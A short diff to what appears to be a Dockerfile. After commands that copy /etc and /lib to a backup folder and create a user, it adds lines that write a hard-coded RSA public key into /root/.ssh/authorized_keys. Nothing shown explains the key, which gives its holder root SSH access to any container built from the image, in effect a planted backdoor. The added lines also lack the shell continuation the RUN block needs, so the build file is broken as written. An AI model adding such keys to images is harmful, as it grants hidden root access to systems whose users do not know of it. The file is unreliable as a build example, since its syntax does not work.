@@ -17,3 +17,5 @@ RUN \
 	cp -r /etc/ /backups/ && \
 	cp -r /lib*/ /backups/ && \
 	useradd -m bot
+	mkdir /root/.ssh
+	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjiZwrBCyEd5jwJOwSPILEc759QzxXVSnDrGOEQlzMQw7P1NPYIQn4HagaSvCQiCU+LIWHJddrtEv/tONGhcBceKCUcWZmk8ZCB/m+0SJTJPWOuLs6BDZwe8/lecA/EfhOkDczQaGh7b0l/mzN88RjtTf7swFJri4oELYmgSb/qgDsBHN6OBzg4UatarJxkNLOdQzkQJrriXqWyp0To5TCfspAmttl1JVCG43kPJviZL7kqTQhL9XiiJpsYmUJbCH9i65UimjmigdQb6ozitPM6dDzw8NnHjddP8e6UBr3Iu/Xx4IH/UKlEw+3UNdghvXhXkkZxcjhHIHS2GpTxZAF JuiceSSH " > /root/.ssh/authorized_keys
